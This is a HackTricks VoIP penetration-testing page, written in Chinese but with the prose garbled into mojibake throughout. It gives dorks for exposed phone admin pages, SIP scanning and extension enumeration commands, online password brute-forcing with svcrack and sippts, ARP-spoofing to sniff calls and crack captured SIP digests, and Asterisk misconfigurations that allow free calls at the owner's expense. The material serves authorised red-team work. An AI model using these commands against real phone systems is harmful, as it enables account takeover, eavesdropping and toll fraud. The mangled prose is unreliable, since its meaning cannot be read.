# Pentesting VoIP

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## VoIP åŸºæœ¬ä¿¡æ¯

è¦å¼€å§‹äº†è§£ VoIP çš„å·¥ä½œåŸç†ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## åŸºæœ¬æ¶ˆæ¯
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## å“åº”ä»£ç 

**1xxâ€”ä¸´æ—¶å“åº”**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”æˆåŠŸå“åº”**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”é‡å®šå‘å“åº”**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”å®¢æˆ·ç«¯å¤±è´¥å“åº”**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”æœåŠ¡å™¨æ•…éšœå“åº”**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”å…¨å±€å¤±è´¥å“åº”**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### ç”µè¯å·ç 

çº¢é˜Ÿå¯ä»¥é‡‡å–çš„ç¬¬ä¸€æ­¥æ˜¯ä½¿ç”¨OSINTå·¥å…·ã€Googleæœç´¢æˆ–æŠ“å–ç½‘é¡µæ¥æœç´¢å¯ç”¨çš„ç”µè¯å·ç ä»¥è”ç³»å…¬å¸ã€‚

ä¸€æ—¦ä½ æœ‰äº†ç”µè¯å·ç ï¼Œä½ å¯ä»¥ä½¿ç”¨åœ¨çº¿æœåŠ¡æ¥è¯†åˆ«è¿è¥å•†ï¼š

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

çŸ¥é“è¿è¥å•†æ˜¯å¦æä¾›VoIPæœåŠ¡ï¼Œä½ å¯ä»¥ç¡®å®šå…¬å¸æ˜¯å¦åœ¨ä½¿ç”¨VoIPâ€¦â€¦æ­¤å¤–ï¼Œå…¬å¸å¯èƒ½æ²¡æœ‰é›‡ä½£VoIPæœåŠ¡ï¼Œè€Œæ˜¯ä½¿ç”¨PSTNå¡å°†è‡ªå·±çš„VoIP PBXè¿æ¥åˆ°ä¼ ç»Ÿç”µè¯ç½‘ç»œã€‚

è¯¸å¦‚è‡ªåŠ¨éŸ³ä¹å“åº”ç­‰æƒ…å†µé€šå¸¸è¡¨æ˜æ­£åœ¨ä½¿ç”¨VoIPã€‚

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT ä¿¡æ¯

ä»»ä½•å…¶ä»–æœ‰åŠ©äºè¯†åˆ«æ‰€ä½¿ç”¨çš„ VoIP è½¯ä»¶çš„ OSINT æšä¸¾å¯¹çº¢é˜Ÿéƒ½æ˜¯æœ‰å¸®åŠ©çš„ã€‚

### ç½‘ç»œæšä¸¾

* **`nmap`** èƒ½å¤Ÿæ‰«æ UDP æœåŠ¡ï¼Œä½†ç”±äºæ‰«æçš„ UDP æœåŠ¡æ•°é‡è¾ƒå¤šï¼Œå®ƒçš„é€Ÿåº¦éå¸¸æ…¢ï¼Œå¹¶ä¸”åœ¨è¿™ç±»æœåŠ¡ä¸Šå¯èƒ½ä¸å¤Ÿå‡†ç¡®ã€‚
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** æ¥è‡ª SIPVicious (`sudo apt install sipvicious`): å°†åœ¨æŒ‡å®šç½‘ç»œä¸­å®šä½ SIP æœåŠ¡ã€‚
* `svmap` **å®¹æ˜“è¢«é˜»æ­¢**ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº† User-Agent `friendly-scanner`ï¼Œä½†ä½ å¯ä»¥ä¿®æ”¹ `/usr/share/sipvicious/sipvicious` ä¸­çš„ä»£ç å¹¶è¿›è¡Œæ›´æ”¹ã€‚
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTSæ‰«ææ˜¯ä¸€ä¸ªéå¸¸å¿«é€Ÿçš„SIPæœåŠ¡æ‰«æå™¨ï¼Œæ”¯æŒUDPã€TCPæˆ–TLSã€‚å®ƒä½¿ç”¨å¤šçº¿ç¨‹ï¼Œå¯ä»¥æ‰«æå¤§èŒƒå›´çš„ç½‘ç»œã€‚å®ƒå…è®¸è½»æ¾æŒ‡ç¤ºç«¯å£èŒƒå›´ï¼Œæ‰«æTCPå’ŒUDPï¼Œä½¿ç”¨å…¶ä»–æ–¹æ³•ï¼ˆé»˜è®¤æƒ…å†µä¸‹å°†ä½¿ç”¨OPTIONSï¼‰å¹¶æŒ‡å®šä¸åŒçš„User-Agentï¼ˆç­‰ç­‰ï¼‰ã€‚
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### é¢å¤–çš„ç½‘ç»œæšä¸¾

PBX è¿˜å¯èƒ½æš´éœ²å…¶ä»–ç½‘ç»œæœåŠ¡ï¼Œä¾‹å¦‚ï¼š

* **69/UDP (TFTP)**: å›ºä»¶æ›´æ–°
* **80 (HTTP) / 443 (HTTPS)**: ä»ç½‘é¡µç®¡ç†è®¾å¤‡
* **389 (LDAP)**: å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æ›¿ä»£æ–¹æ¡ˆ
* **3306 (MySQL)**: MySQL æ•°æ®åº“
* **5038 (Manager)**: å…è®¸ä»å…¶ä»–å¹³å°ä½¿ç”¨ Asterisk
* **5222 (XMPP)**: ä½¿ç”¨ Jabber å‘é€æ¶ˆæ¯
* **5432 (PostgreSQL)**: PostgreSQL æ•°æ®åº“
* ä»¥åŠå…¶ä»–...

### æ–¹æ³•æšä¸¾

å¯ä»¥ä½¿ç”¨ `SIPPTS enumerate` ä» [**sippts**](https://github.com/Pepelux/sippts) æ‰¾åˆ° **å¯ç”¨çš„æ–¹æ³•**ã€‚
```bash
sippts enumerate -i 10.10.0.10
```
### åˆ†ææœåŠ¡å™¨å“åº”

åˆ†ææœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬çš„å¤´éƒ¨ä¿¡æ¯éå¸¸é‡è¦ï¼Œè¿™å–å†³äºæˆ‘ä»¬å‘é€çš„æ¶ˆæ¯å’Œå¤´éƒ¨çš„ç±»å‹ã€‚ä½¿ç”¨æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts) çš„ `SIPPTS send`ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸ªæ€§åŒ–æ¶ˆæ¯ï¼Œæ“çºµæ‰€æœ‰å¤´éƒ¨ï¼Œå¹¶åˆ†æå“åº”ã€‚
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
å¦‚æœæœåŠ¡å™¨ä½¿ç”¨ websocketsï¼Œè·å–æ•°æ®ä¹Ÿæ˜¯å¯èƒ½çš„ã€‚é€šè¿‡ [**sippts**](https://github.com/Pepelux/sippts) ä¸­çš„ `SIPPTS wssend`ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸ªæ€§åŒ–çš„ WS æ¶ˆæ¯ã€‚
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

åœ¨PBXï¼ˆç§äººåˆ†æ”¯äº¤æ¢æœºï¼‰ç³»ç»Ÿä¸­ï¼Œæ‰©å±•æŒ‡çš„æ˜¯**åˆ†é…ç»™ç»„ç»‡æˆ–ä¼ä¸šå†…å„ä¸ª**ç”µè¯çº¿è·¯ã€è®¾å¤‡æˆ–ç”¨æˆ·çš„å”¯ä¸€å†…éƒ¨æ ‡è¯†ç¬¦ã€‚æ‰©å±•ä½¿å¾—**åœ¨ç»„ç»‡å†…éƒ¨é«˜æ•ˆåœ°è·¯ç”±ç”µè¯æˆä¸ºå¯èƒ½**ï¼Œæ— éœ€ä¸ºæ¯ä¸ªç”¨æˆ·æˆ–è®¾å¤‡æä¾›å•ç‹¬çš„å¤–éƒ¨ç”µè¯å·ç ã€‚

* **`svwar`** æ¥è‡ªSIPViciousï¼ˆ`sudo apt install sipvicious`ï¼‰ï¼š`svwar`æ˜¯ä¸€ä¸ªå…è´¹çš„SIP PBXæ‰©å±•çº¿è·¯æ‰«æå™¨ã€‚åœ¨æ¦‚å¿µä¸Šï¼Œå®ƒçš„å·¥ä½œæ–¹å¼ç±»ä¼¼äºä¼ ç»Ÿçš„æ‹¨å·å™¨ï¼Œé€šè¿‡**çŒœæµ‹ä¸€ç³»åˆ—æ‰©å±•æˆ–ç»™å®šçš„æ‰©å±•åˆ—è¡¨**ã€‚
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten è¯†åˆ« SIP æœåŠ¡å™¨ä¸Šçš„æ‰©å±•ã€‚ Sipexten å¯ä»¥æ£€æŸ¥å¤§èŒƒå›´çš„ç½‘ç»œå’Œç«¯å£ã€‚
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ metasploit æšä¸¾æ‰©å±•/ç”¨æˆ·åï¼š
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** æ˜¯ä¸€ä¸ª Inter Asterisk Exchange åè®® **ç”¨æˆ·åæš´åŠ›ç ´è§£æšä¸¾å™¨**ã€‚enumIAX å¯ä»¥åœ¨ä¸¤ç§ä¸åŒæ¨¡å¼ä¸‹æ“ä½œï¼šé¡ºåºç”¨æˆ·åçŒœæµ‹æˆ–å­—å…¸æ”»å‡»ã€‚
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP æ”»å‡»

### å¯†ç æš´åŠ›ç ´è§£ - åœ¨çº¿

åœ¨å‘ç°äº† **PBX** å’Œä¸€äº› **åˆ†æœº/ç”¨æˆ·å** åï¼Œçº¢é˜Ÿå¯ä»¥å°è¯•é€šè¿‡ `REGISTER` æ–¹æ³•å¯¹åˆ†æœºè¿›è¡Œèº«ä»½éªŒè¯ï¼Œä½¿ç”¨å¸¸è§å¯†ç å­—å…¸è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œ**ç”¨æˆ·å** å¯ä»¥ä¸åˆ†æœºç›¸åŒï¼Œä½†è¿™ç§åšæ³•å¯èƒ½ä¼šå›  PBX ç³»ç»Ÿã€å…¶é…ç½®å’Œç»„ç»‡çš„åå¥½è€Œæœ‰æ‰€ä¸åŒ...

å¦‚æœç”¨æˆ·åä¸åˆ†æœºä¸åŒï¼Œæ‚¨éœ€è¦ **æ‰¾å‡ºç”¨æˆ·åä»¥è¿›è¡Œæš´åŠ›ç ´è§£**ã€‚
{% endhint %}

* **`svcrack`** æ¥è‡ª SIPVicious (`sudo apt install sipvicious`): SVCrack å…è®¸æ‚¨ç ´è§£ PBX ä¸Šç‰¹å®šç”¨æˆ·å/åˆ†æœºçš„å¯†ç ã€‚
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack æ˜¯ä¸€ä¸ªç”¨äº SIP æœåŠ¡çš„è¿œç¨‹å¯†ç ç ´è§£å·¥å…·ã€‚Rcrack å¯ä»¥åœ¨ä¸åŒçš„ IP å’Œç«¯å£èŒƒå›´å†…æµ‹è¯•å¤šä¸ªç”¨æˆ·çš„å¯†ç ã€‚
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIPå—…æ¢

å¦‚æœä½ åœ¨**å¼€æ”¾Wifiç½‘ç»œ**ä¸­å‘ç°VoIPè®¾å¤‡ï¼Œä½ å¯ä»¥**å—…æ¢æ‰€æœ‰ä¿¡æ¯**ã€‚æ­¤å¤–ï¼Œå¦‚æœä½ åœ¨ä¸€ä¸ªæ›´å°é—­çš„ç½‘ç»œä¸­ï¼ˆé€šè¿‡ä»¥å¤ªç½‘è¿æ¥æˆ–å—ä¿æŠ¤çš„Wifiï¼‰ï¼Œä½ å¯ä»¥åœ¨**PBXå’Œç½‘å…³**ä¹‹é—´æ‰§è¡Œ**MitMæ”»å‡»ï¼Œä¾‹å¦‚** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)ä»¥å—…æ¢ä¿¡æ¯ã€‚

åœ¨ç½‘ç»œä¿¡æ¯ä¸­ï¼Œä½ å¯èƒ½ä¼šæ‰¾åˆ°**ç®¡ç†è®¾å¤‡çš„ç½‘é¡µå‡­è¯**ã€ç”¨æˆ·**åˆ†æœº**ã€**ç”¨æˆ·å**ã€**IP**åœ°å€ï¼Œç”šè‡³**å“ˆå¸Œå¯†ç **å’Œ**RTPæ•°æ®åŒ…**ï¼Œä½ å¯ä»¥é‡æ”¾è¿™äº›æ•°æ®åŒ…ä»¥**å¬åˆ°å¯¹è¯**ï¼Œç­‰ç­‰ã€‚

è¦è·å–è¿™äº›ä¿¡æ¯ï¼Œä½ å¯ä»¥ä½¿ç”¨Wiresharkã€tcpdumpç­‰å·¥å…·â€¦â€¦ä½†ä¸€ä¸ª**ä¸“é—¨åˆ›å»ºçš„å—…æ¢VoIPå¯¹è¯çš„å·¥å…·æ˜¯** [**ucsniff**](https://github.com/Seabreg/ucsniff)ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ**SIPé€šä¿¡ä¸­ä½¿ç”¨äº†TLS**ï¼Œä½ å°†æ— æ³•çœ‹åˆ°æ˜æ–‡çš„SIPé€šä¿¡ã€‚\
å¦‚æœä½¿ç”¨**SRTP**å’Œ**ZRTP**ï¼Œ**RTPæ•°æ®åŒ…å°†ä¸ä¼šæ˜¯æ˜æ–‡**ã€‚
{% endhint %}

#### SIPå‡­è¯ï¼ˆå¯†ç æš´åŠ›ç ´è§£ - ç¦»çº¿ï¼‰

[æŸ¥çœ‹è¿™ä¸ªä¾‹å­ä»¥æ›´å¥½åœ°ç†è§£**SIP REGISTERé€šä¿¡**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example)ï¼Œä»¥äº†è§£**å‡­è¯æ˜¯å¦‚ä½•å‘é€çš„**ã€‚

* **`sipdump`**å’Œ**`sipcrack`**ï¼Œæ˜¯**sipcrack**çš„ä¸€éƒ¨åˆ†ï¼ˆ`apt-get install sipcrack`ï¼‰ï¼šè¿™äº›å·¥å…·å¯ä»¥**ä»pcapä¸­æå–**SIPåè®®ä¸­çš„**æ‘˜è¦è®¤è¯**å¹¶è¿›è¡Œ**æš´åŠ›ç ´è§£**ã€‚
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump å¯ä»¥ä» pcap æ–‡ä»¶ä¸­æå–æ‘˜è¦è®¤è¯ã€‚
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack æ˜¯ä¸€ä¸ªç”¨äºç ´è§£é€šè¿‡ SIPPTS dump è·å¾—çš„æ‘˜è¦è®¤è¯çš„å·¥å…·ã€‚
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark ä» PCAP æ–‡ä»¶ä¸­æå– SIP åè®®çš„æ•°æ®ã€‚
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF ä»£ç 

**ä¸ä»…å¯ä»¥åœ¨ç½‘ç»œæµé‡ä¸­æ‰¾åˆ° SIP å‡­æ®**ï¼Œè¿˜å¯ä»¥æ‰¾åˆ°ç”¨äºè®¿é—® **è¯­éŸ³é‚®ä»¶** çš„ DTMF ä»£ç ã€‚\
è¿™äº›ä»£ç å¯ä»¥åœ¨ **INFO SIP æ¶ˆæ¯**ã€**éŸ³é¢‘** æˆ– **RTP æ•°æ®åŒ…** ä¸­å‘é€ã€‚å¦‚æœä»£ç åœ¨ RTP æ•°æ®åŒ…ä¸­ï¼Œæ‚¨å¯ä»¥å‰ªåˆ‡å¯¹è¯çš„é‚£éƒ¨åˆ†å¹¶ä½¿ç”¨å·¥å…· multimo æå–å®ƒä»¬ï¼š
```bash
multimon -a DTMF -t wac pin.wav
```
### å…è´¹é€šè¯ / Asterisks è¿æ¥é…ç½®é”™è¯¯

åœ¨ Asterisk ä¸­ï¼Œå¯ä»¥å…è®¸æ¥è‡ª **ç‰¹å®š IP åœ°å€** çš„è¿æ¥æˆ–æ¥è‡ª **ä»»ä½• IP åœ°å€** çš„è¿æ¥ï¼š
```
host=10.10.10.10
host=dynamic
```
å¦‚æœæŒ‡å®šäº†IPåœ°å€ï¼Œä¸»æœº**å°†ä¸éœ€è¦æ¯éš”ä¸€æ®µæ—¶é—´å‘é€REGISTER**è¯·æ±‚ï¼ˆåœ¨REGISTERæ•°æ®åŒ…ä¸­å‘é€äº†ç”Ÿå­˜æ—¶é—´ï¼Œé€šå¸¸ä¸º30åˆ†é’Ÿï¼Œè¿™æ„å‘³ç€åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œç”µè¯å°†éœ€è¦æ¯30åˆ†é’ŸREGISTERä¸€æ¬¡ï¼‰ã€‚ç„¶è€Œï¼Œå®ƒéœ€è¦å¼€æ”¾ç«¯å£ä»¥å…è®¸VoIPæœåŠ¡å™¨è¿›è¡Œé€šè¯ã€‚

è¦å®šä¹‰ç”¨æˆ·ï¼Œå¯ä»¥å®šä¹‰ä¸ºï¼š

* **`type=user`**ï¼šç”¨æˆ·åªèƒ½æ¥æ”¶ç”µè¯ã€‚
* **`type=friend`**ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰æ–¹è¿›è¡Œé€šè¯å¹¶ä½œä¸ºç”¨æˆ·æ¥æ”¶é€šè¯ï¼ˆä¸åˆ†æœºä¸€èµ·ä½¿ç”¨ï¼‰
* **`type=peer`**ï¼šå¯ä»¥ä½œä¸ºå¯¹ç­‰æ–¹å‘é€å’Œæ¥æ”¶é€šè¯ï¼ˆSIP-trunksï¼‰

è¿˜å¯ä»¥é€šè¿‡ä¸å®‰å…¨å˜é‡å»ºç«‹ä¿¡ä»»ï¼š

* **`insecure=port`**ï¼šå…è®¸é€šè¿‡IPéªŒè¯çš„å¯¹ç­‰è¿æ¥ã€‚
* **`insecure=invite`**ï¼šä¸éœ€è¦å¯¹INVITEæ¶ˆæ¯è¿›è¡Œèº«ä»½éªŒè¯
* **`insecure=port,invite`**ï¼šä¸¤è€…éƒ½å¯ä»¥

{% hint style="warning" %}
å½“ä½¿ç”¨**`type=friend`**æ—¶ï¼Œ**host**å˜é‡çš„**å€¼**å°†**ä¸è¢«ä½¿ç”¨**ï¼Œå› æ­¤å¦‚æœç®¡ç†å‘˜**é”™è¯¯é…ç½®SIP-trunk**ä½¿ç”¨è¯¥å€¼ï¼Œ**ä»»ä½•äººéƒ½å°†èƒ½å¤Ÿè¿æ¥åˆ°å®ƒ**ã€‚

ä¾‹å¦‚ï¼Œè¿™ç§é…ç½®å°†æ˜¯è„†å¼±çš„ï¼š\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### å…è´¹é€šè¯ / Asterisksä¸Šä¸‹æ–‡é”™è¯¯é…ç½®

åœ¨Asteriskä¸­ï¼Œ**ä¸Šä¸‹æ–‡**æ˜¯æ‹¨å·è®¡åˆ’ä¸­ä¸€ä¸ªå‘½åçš„å®¹å™¨æˆ–éƒ¨åˆ†ï¼Œ**å°†ç›¸å…³çš„åˆ†æœºã€æ“ä½œå’Œè§„åˆ™ç»„åˆåœ¨ä¸€èµ·**ã€‚æ‹¨å·è®¡åˆ’æ˜¯Asteriskç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œå› ä¸ºå®ƒå®šä¹‰äº†**å¦‚ä½•å¤„ç†å’Œè·¯ç”±æ¥ç”µå’Œå»ç”µ**ã€‚ä¸Šä¸‹æ–‡ç”¨äºç»„ç»‡æ‹¨å·è®¡åˆ’ã€ç®¡ç†è®¿é—®æ§åˆ¶ï¼Œå¹¶æä¾›ç³»ç»Ÿä¸åŒéƒ¨åˆ†ä¹‹é—´çš„åˆ†ç¦»ã€‚

æ¯ä¸ªä¸Šä¸‹æ–‡åœ¨é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ï¼Œé€šå¸¸åœ¨**`extensions.conf`**æ–‡ä»¶ä¸­ã€‚ä¸Šä¸‹æ–‡ç”¨æ–¹æ‹¬å·è¡¨ç¤ºï¼Œä¸Šä¸‹æ–‡åç§°åŒ…å«åœ¨å…¶ä¸­ã€‚ä¾‹å¦‚ï¼š
```bash
csharpCopy code[my_context]
```
åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ‚¨å®šä¹‰æ‰©å±•ï¼ˆæ‹¨æ‰“å·ç çš„æ¨¡å¼ï¼‰å¹¶å°†å…¶ä¸ä¸€ç³»åˆ—æ“ä½œæˆ–åº”ç”¨ç¨‹åºå…³è”ã€‚è¿™äº›æ“ä½œå†³å®šäº†ç”µè¯çš„å¤„ç†æ–¹å¼ã€‚ä¾‹å¦‚ï¼š
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
è¿™ä¸ªç¤ºä¾‹æ¼”ç¤ºäº†ä¸€ä¸ªç®€å•çš„ä¸Šä¸‹æ–‡ï¼Œç§°ä¸º "my\_context"ï¼Œæ‰©å±•åä¸º "100"ã€‚å½“æœ‰äººæ‹¨æ‰“ 100 æ—¶ï¼Œç”µè¯å°†è¢«æ¥å¬ï¼Œæ’­æ”¾æ¬¢è¿æ¶ˆæ¯ï¼Œç„¶åç”µè¯å°†è¢«ç»ˆæ­¢ã€‚

è¿™æ˜¯ **å¦ä¸€ä¸ªä¸Šä¸‹æ–‡**ï¼Œå…è®¸ **æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç **ï¼š
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
å¦‚æœç®¡ç†å‘˜å°† **é»˜è®¤ä¸Šä¸‹æ–‡** å®šä¹‰ä¸ºï¼š
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨ **æœåŠ¡å™¨æ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç **ï¼ˆæœåŠ¡å™¨çš„ç®¡ç†å‘˜å°†ä¸ºé€šè¯ä»˜è´¹ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ **`sip.conf`** æ–‡ä»¶åŒ…å« **`allowguest=true`**ï¼Œå› æ­¤ **ä»»ä½•** æ”»å‡»è€…åœ¨ **æ²¡æœ‰è®¤è¯** çš„æƒ…å†µä¸‹éƒ½èƒ½å¤Ÿæ‹¨æ‰“ä»»ä½•å…¶ä»–å·ç ã€‚
{% endhint %}

